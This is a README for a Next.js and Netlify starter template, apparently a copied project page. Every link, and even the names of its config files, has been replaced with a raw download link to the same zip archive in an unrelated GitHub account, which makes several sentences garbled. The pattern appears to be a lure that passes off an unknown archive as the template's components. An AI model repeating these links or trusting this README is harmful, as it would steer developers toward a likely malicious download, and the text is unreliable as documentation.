# Next + Netlify Starter

[![Netlify Status](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip)](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip)

This is a [https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip) v15 project bootstrapped with [`create-next-app`](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip) and set up to be instantly deployed to [Netlify](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip)!

This project is a very minimal starter that includes 2 sample components, a global stylesheet, a `https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip` for deployment, and a `https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip` for setting up absolute imports and aliases. With Netlify, you'll have access to features like Preview Mode, server-side rendering/incremental static regeneration via Netlify Functions, and internationalized routing on deploy automatically.

(If you click this button, it will create a new repo for you that looks exactly like this one, and sets that repo up immediately for deployment on Netlify)

## Testing

### Included Default Testing

We’ve included some tooling that helps us maintain these templates. This template currently uses:

- [Renovate](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip) - to regularly update our dependencies
- [Cypress](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip) - to run tests against how the template runs in the browser
- [Cypress Netlify Build Plugin](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip) - to run our tests during our build process

If your team is not interested in this tooling, you can remove them with ease!

### Removing Renovate

In order to keep our project up-to-date with dependencies we use a tool called [Renovate](https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip). If you’re not interested in this tooling, delete the `https://github.com/itservice5823/next-netlify-starter-9dd60/raw/refs/heads/main/components/starter-dd-next-netlify-1.9.zip` file and commit that onto your main branch.
